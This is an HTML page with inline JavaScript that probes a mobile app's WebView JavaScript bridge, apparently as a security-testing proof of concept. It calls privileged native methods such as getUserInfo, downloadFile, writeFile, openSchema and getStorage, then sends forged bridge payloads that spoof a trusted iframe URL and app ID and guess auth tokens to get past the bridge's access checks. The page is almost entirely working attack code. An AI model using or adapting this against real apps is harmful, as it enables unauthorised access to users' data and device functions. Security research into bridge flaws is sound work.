<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HG_JSB3</title>
</head>
<body>
<h1>HG_JSB3</h1>
<pre id="out"></pre>
<script>
function log(s) {
  document.getElementById("out").textContent += s + "\n";
}
window.JSBridge = {
  _handleMessageFromApp: function (msg) {
    try { log("cb=" + JSON.stringify(msg).slice(0, 500)); }
    catch (e) { log("cb=" + String(msg).slice(0, 500)); }
  }
};
window.Native2JSBridge = window.JSBridge;
log("href=" + location.href);
var b = window.JS2NativeBridge;
log("bridge=" + typeof b);
if (b) {
  log("bkeys=" + Object.keys(b).join(","));
  log("call=" + typeof b.call + " inv=" + typeof b._invokeMethod + " sync=" + typeof b.callSync);
}
var methods = [
  "x.getMethodList", "x.canIUse", "x.getAppInfo", "x.getUserInfo",
  "x.open", "x.openSchema", "openSchema", "x.downloadFile",
  "x.updateGecko", "x.request", "x.getAbsolutePath",
  "app.getStorage", "x.saveDataURL", "x.writeFile", "x.getGeckoInfo"
];
function fire(name) {
  if (!b) { log(name + " no-bridge"); return; }
  try {
    if (b.call) {
      var r = b.call(name, JSON.stringify({}));
      log("call " + name + " ret=" + JSON.stringify(r));
    }
  } catch (e) { log("call " + name + " err=" + e); }
  try {
    if (b._invokeMethod) {
      var payload = {
        func: name,
        params: {},
        __callback_id: "cb_" + name.replace(/\./g, "_"),
        __msg_type: "callback",
        JSSDK: "1",
        namespace: "host"
      };
      var r2 = b._invokeMethod(JSON.stringify(payload));
      log("inv " + name + " ret=" + JSON.stringify(r2));
    }
  } catch (e) { log("inv " + name + " err=" + e); }
  try {
    if (b.callSync) {
      var r3 = b.callSync(name, JSON.stringify({}));
      log("sync " + name + " ret=" + String(r3).slice(0, 300));
    }
  } catch (e) { log("sync " + name + " err=" + e); }
}
methods.forEach(fire);

var SPOOF_IFRAME = "https://reading.snssdk.com/reading_offline/drlazy/page/general-rules.html";
function fireSpoof(name, token) {
  if (!b || !b._invokeMethod) { log("spoof " + name + " tok=" + JSON.stringify(token) + " no-inv"); return; }
  var tokTag = token === "" ? "empty" : String(token);
  var payload = {
    func: name,
    params: {},
    __callback_id: "cb_spoof_" + name.replace(/\./g, "_") + "_tok" + tokTag,
    __msg_type: "callback",
    JSSDK: "1",
    namespace: "host",
    appID: 8662,
    __iframe_url: SPOOF_IFRAME,
    __bridgeAuthToken: token
  };
  try {
    var r = b._invokeMethod(JSON.stringify(payload));
    log("spoof " + name + " tok=" + JSON.stringify(token) + " ret=" + JSON.stringify(r));
  } catch (e) {
    log("spoof " + name + " tok=" + JSON.stringify(token) + " err=" + e);
  }
}
log("spoof_begin iframe=" + SPOOF_IFRAME);
["x.getAppInfo", "x.open"].forEach(function (name) {
  fireSpoof(name, "");
  fireSpoof(name, "1");
});
log("spoof_sent");
setTimeout(function () { log("done"); }, 5000);
</script>
